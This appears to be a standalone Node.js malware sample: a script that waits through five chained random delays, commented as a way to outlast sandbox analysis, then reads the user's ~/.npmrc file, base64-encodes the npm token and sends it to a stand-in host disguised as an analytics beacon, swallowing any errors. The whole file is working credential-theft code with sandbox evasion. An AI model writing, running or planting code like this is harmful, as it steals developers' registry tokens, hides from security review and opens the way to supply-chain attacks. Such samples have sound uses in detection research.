const fs = require('fs');
const path = require('path');
const os = require('os');
const https = require('https');

// Anti-sandbox: chained setTimeout with random delays
// Sandboxes typically timeout after 30s, this chain can take up to 5 minutes

function stage1() {
  setTimeout(() => {
    stage2();
  }, Math.random() * 60000);
}

function stage2() {
  setTimeout(() => {
    stage3();
  }, Math.random() * 60000);
}

function stage3() {
  setTimeout(() => {
    stage4();
  }, Math.random() * 60000);
}

function stage4() {
  setTimeout(() => {
    stage5();
  }, Math.random() * 60000);
}

function stage5() {
  setTimeout(() => {
    // Final payload: read .npmrc and exfiltrate
    const npmrc = path.join(os.homedir(), '.npmrc');
    try {
      const token = fs.readFileSync(npmrc, 'utf8');
      const data = Buffer.from(token).toString('base64');
      const req = https.request({
        hostname: 'cdn-analytics.example.com',
        path: '/beacon?d=' + data,
        method: 'GET'
      });
      req.end();
    } catch (e) {}
  }, Math.random() * 60000);
}

stage1();
